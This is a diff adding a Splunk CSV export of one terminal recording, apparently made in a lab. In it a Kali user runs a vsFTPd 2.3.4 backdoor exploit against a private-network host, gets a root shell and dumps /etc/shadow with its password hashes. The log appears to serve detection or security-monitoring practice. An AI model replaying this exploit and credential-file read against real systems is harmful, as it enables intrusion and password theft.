@@ -1,0 +1,82 @@
+"_raw","_time",host,index,linecount,source,sourcetype,"splunk_server"
+"Script started on 2025-05-01 12:20:15+03:00 [TERM=""xterm-256color"" TTY=""/dev/pts/0"" COLUMNS=""146"" LINES=""49""]
+                                                                                                                                                  
+]0;ali-kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mali-kali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004hip a[36mi[36mp[39m[2C[36ms[36mu[39mdo dpkg --add-architecture armhf[34D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36md[36mp[36mk[36mg[39m [32m-[32m-[32ma[32md[32md[32m-[32ma[32mr[32mc[32mh[32mi[32mt[32me[32mc[32mt[32mu[32mr[32me[39m[6C[34D[4m[32md[4m[32mp[4m[32mk[4m[32mg[24m[39m [36m-[36m-[36ma[36md[39md[5P[12C[32me[32m [32ma[32mr[32mm[32mh[39mf     [29D[24m[36md[24m[36mp[24m[36mk[24m[36mg[39m [32m-[32m-[32ma[32md[32md[12C[32me[39m[39m [39ma[39mr[39mm[39mh[1C[29D[36ms[36mu[36md[36mo[39m [32md[32mp[32mk[32mg[32m [32m-[32mi[32m [32ms[32mp[32ml[32mu[32mn[32mk[32m.[32md[32me[32mb[39m      [23D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36md[36mp[36mk[36mg[39m[39m [32m-[32mi[39m[39m [39ms[39mp[39ml[39mu[39mn[39mk[39m.[39md[39me[39mb[23D[7m[4m[32m^[7m[4m[32m[[27m[24m[39m[4m[32m[[4m[32m2[4m[32m0[24m[39m[39m0[36m~[36ms[36mu[36md[39m[39mo[32m [32md[39mpkg -i splunk.deb[30D[39m[7m[4m^[39m[7m[4m[[27m[24m[24m[1m[31m[[0m[39m[39m[4m2[39m[4m0[4m0[39m[4m~[39m[4ms[39m[4mu[39m[4md[4mo[24m[39m [39md[4C[32m-[32mi[39m[11C[30D[27m[4ms[27m[24m[24m[1m[31mu[0m[39m[0m[39m[4md[4mo[4m [4md[4mp[4mk[4mg[4m [24m[24m-i spl[32mu[32mn[39m[39mk-9.3.2-d8bb32809498-linux-2.6-amd64.deb[58D[4m[32ms[0m[4m[32mu[4m[32md[4m[32mo[24m[39m[24m [24m[36md[24m[36mp[24m[36mk[24m[36mg[39m[24m [32m-[32mi[39m [1ms[1mp[1ml[39m[1mu[39m[1mn[1mk[1m-[1m9[1m.[1m3[1m.[1m2[1m-[1md[1m8[1mb[1mb[1m3[1m2[1m8[1m0[1m9[1m4[1m9[1m8[1m-[1ml[1mi[1mn[1mu[1mx[1m-[1m2[1m.[1m6[1m-[1ma[1mm[1md[1m6[1m4[1m.[1md[1me[1mb[0m[58D[4m[32mc[4m[32ml[4m[32me[4m[32ma[24m[39mr[39m [39m [39m [39m  [39m [39m  [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [53D[24m[36mc[24m[36ml[24m[36me[24m[36ma[36mr[39m[36ms[36mu[36md[36mo[36m [39mdpkg -i splunk-9.3.2-d8bb32809498-linux-2.6-amd64.deb[58D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m[39m [36md[36mp[36mk[36mg[39m [32m-[32mi[39m [1ms[1mp[1ml[1mu[1mn[1mk[1m-[1m9[1m.[1m3[1m.[1m2[1m-[1md[1m8[1mb[1mb[1m3[1m2[1m8[1m0[1m9[1m4[1m9[1m8[1m-[1ml[1mi[1mn[1mu[1mx[1m-[1m2[1m.[1m6[1m-[1ma[1mm[1md[1m6[1m4[1m.[1md[1me[1mb[0m[58D[7m[4m[32m^[7m[4m[32m[[27m[24m[39m[4m[32m[[4m[32m2[4m[32m0[24m[39m[39m0[36m~[36ms[36mu[36md[39m[39mo[32m [32md[39m[0mp[1mk[1mg[1m [1m-[1mi[1m [1ms[1mp[1ml[1mu[1mn[1mk[1m.[1md[1me[1mb[0m[0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [28D[30D[39m[7m[4m^[39m[7m[4m[[27m[24m[24m[1m[31m[[0m[39m[39m[4m2[39m[4m0[4m0[39m[4m~[39m[4ms[39m[4mu[39m[4md[4mo[24m[39m [39mdp[0mk[0mg[0m [0m[32m-[0m[32mi[39m[0m [0ms[0mp[0ml[0mu[0mn[0mk[0m.[0md[0me[0mb[30D[27m[4ms[27m[24m[24m[1m[31mu[0m[39m[0m[39m[4md[4mo[4m [4md[4mp[4mk[4mg[4m [24m[24m-i spl[32mu[32mn[39m[39mk.deb       [23D[4m[32ms[0m[4m[32mu[4m[32md[4m[32mo[24m[39m[24m [24m[36md[24m[36mp[24m[36mk[24m[36mg[39m[24m [32m-[32mi[39m[4C[39mu[39mn[5C[23D[4m[32md[4m[32mp[4m[32mk[4m[32mg[24m[39m [36m-[36m-[36ma[36md[39md[32m-[32ma[39mrchitecture armhf[29D[24m[36md[24m[36mp[24m[36mk[24m[36mg[39m [32m-[32m-[32ma[32md[32md[32m-[32ma[32mr[32mc[32mh[32mi[32mt[32me[32mc[32mt[32mu[32mr[32me[39m[6C[29D[36ms[36mu[36md[36mo[39m [32md[32mp[32mk[32mg[32m [32m-[32m-[32ma[32md[32md[32m-[32ma[32mr[32mc[32mh[32mi[32mt[32me[39mcture armhf[34D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36md[36mp[36mk[36mg[39m[39m [12C[32me[32mc[32mt[32mu[32mr[32me[39m[6C[34D[4m[32mi[4m[32mp[4m[32m [4m[32ma[24m[39m [39m [39m [39m [39m  [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m       [30D[24m[36mi[24m[36mp[39m[24m[39m [24m[39ma[39m [39m   ip a[36mi[36mp[39m[2C[36ms[36mu[39mdo dpkg --add-architecture armhf[34D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36md[36mp[36mk[36mg[39m [32m-[32m-[32ma[32md[32md[32m-[32ma[32mr[32mc[32mh[32mi[32mt[32me[32mc[32mt[32mu[32mr[32me[39m[6C[34D[4m[32md[4m[32mp[4m[32mk[4m[32mg[24m[39m [36m-[36m-[36ma[36md[39md[5P[12C[32me[32m [32ma[32mr[32mm[32mh[39mf     [29D[24m[36md[24m[36mp[24m[36mk[24m[36mg[39m [32m-[32m-[32ma[32md[32md[12C[32me[39m[39m [39ma[39mr[39mm[39mh[1C[29D[36ms[36mu[36md[36mo[39m [32md[32mp[32mk[32mg[32m [32m-[32mi[32m [32ms[32mp[32ml[32mu[32mn[32mk[32m.[32md[32me[32mb[39m      [23D[4m[32ms[4m[32mu[4m[32md[4m[32mo[24m[39m [36md[36mp[36mk[36mg[39m[39m [32m-[32mi[39m[39m [39ms[39mp[39ml[39mu[39mn[39mk[39m.[39md[39me[39mb[23D[7m[4m[32m^[7m[4m[32m[[27m[24m[39m[4m[32m[[4m[32m2[4m[32m0[24m[39m[39m0[36m~[36ms[36mu[36md[39m[39mo[32m [32md[39mpkg -i splunk.deb[30D[39m[7m[4m^[39m[7m[4m[[27m[24m[24m[1m[31m[[0m[39m[39m[4m2[39m[4m0[4m0[39m[4m~[39m[4ms[39m[4mu[39m[4md[4mo[24m[39m [39md[4C[32m-[32mi[39m[11C[30D[27m[4ms[27m[24m[24m[1m[31mu[0m[39m[0m[39m[4md[4mo[4m [4md[4mp[4mk[4mg[4m [24m[24m-i spl[32mu[32mn[39m[39mk-9.3.2-d8bb32809498-linux-2.6-amd64.deb[58D[4m[32ms[0m[4m[32mu[4m[32md[4m[32mo[24m[39m[24m [24m[36md[24m[36mp[24m[36mk[24m[36mg[39m[24m [32m-[32mi[39m [1ms[1mp[1ml[39m[1mu[39m[1mn[1mk[1m-[1m9[1m.[1m3[1m.[1m2[1m-[1md[1m8[1mb[1mb[1m3[1m2[1m8[1m0[1m9[1m4[1m9[1m8[1m-[1ml[1mi[1mn[1mu[1mx[1m-[1m2[1m.[1m6[1m-[1ma[1mm[1md[1m6[1m4[1m.[1md[1me[1mb[0m[58D[4m[32mc[4m[32ml[4m[32me[4m[32ma[24m[39mr[39m [39m [39m [39m  [39m [39m  [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [0m [53D[24m[36mc[24m[36ml[24m[36me[24m[36ma[36mr[39m[36m.[36m/[36me[36mx[36mp[39mloit_vsftpd.sh 192.168.3.21[28D[36mp[36ml[36mo[36mi[36mt[36m_[36mv[36ms[36mf[36mt[36mp[36md[36m.[36ms[36mh[39m[13C[?1l>[?2004l
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[0mPAYLOAD => cmd/unix/interact
+[0mRHOSTS => 192.168.3.21
+[0mRPORT => 21
+[0m[1m[34m[*][0m 192.168.3.21:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 192.168.3.21:21 - USER: 331 Please specify the password.
+[1m[34m[*][0m Exploit completed, but no session was created.
+[0m[*] Attempting to connect to backdoor shell on 192.168.3.21:6200
+whoami
+root
+cat /etc/shadw ow
+root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
+daemon:*:14684:0:99999:7:::
+bin:*:14684:0:99999:7:::
+sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
+sync:*:14684:0:99999:7:::
+games:*:14684:0:99999:7:::
+man:*:14684:0:99999:7:::
+lp:*:14684:0:99999:7:::
+mail:*:14684:0:99999:7:::
+news:*:14684:0:99999:7:::
+uucp:*:14684:0:99999:7:::
+proxy:*:14684:0:99999:7:::
+www-data:*:14684:0:99999:7:::
+backup:*:14684:0:99999:7:::
+list:*:14684:0:99999:7:::
+irc:*:14684:0:99999:7:::
+gnats:*:14684:0:99999:7:::
+nobody:*:14684:0:99999:7:::
+libuuid:!:14684:0:99999:7:::
+dhcp:*:14684:0:99999:7:::
+syslog:*:14684:0:99999:7:::
+klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
+sshd:*:14684:0:99999:7:::
+msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
+bind:*:14685:0:99999:7:::
+postfix:*:14685:0:99999:7:::
+ftp:*:14685:0:99999:7:::
+postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
+mysql:!:14685:0:99999:7:::
+tomcat55:*:14691:0:99999:7:::
+distccd:*:14698:0:99999:7:::
+user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
+service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
+telnetd:*:14715:0:99999:7:::
+proftpd:!:14727:0:99999:7:::
+statd:*:15474:0:99999:7:::
+ls 
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd
+initrd.img
+lib
+lost+found
+media
+mnt
+nohup.out
+opt
+proc
+root
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+^C
+                                                                                                                                                  
+]0;ali-kali@kali: ~
+[0m[27m[24m[J[32m┌──([1m[32m[34mali-kali㉿kali[0m[34m[32m)-[[1m[32m[39m~[0m[32m]
+└─[1m[32m[34m$[0m[34m[39m [K[?1h=[?2004he[1me[0m[1me[0m[38;2;153;153;153mcho ""This file is confidential and signed."" > secure.txt[39m[56D[1me[39m[1mx[0m[39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [39m [55D[0m[36me[0m[36mx[39m[36me[36mx[36mi[39m[39m[4me[39m[4mx[39m[4mi[24m[4mi[4mt[24m[24m[36me[24m[36mx[24m[36mi[24m[36mt[39m[?1l>[?2004l","2025-05-01T12:20:15.000+0300","ali-kali",main,81,"metasploit_vsftpd_attack.log",AttackerLog,"Alis-MacBook-Air.local"
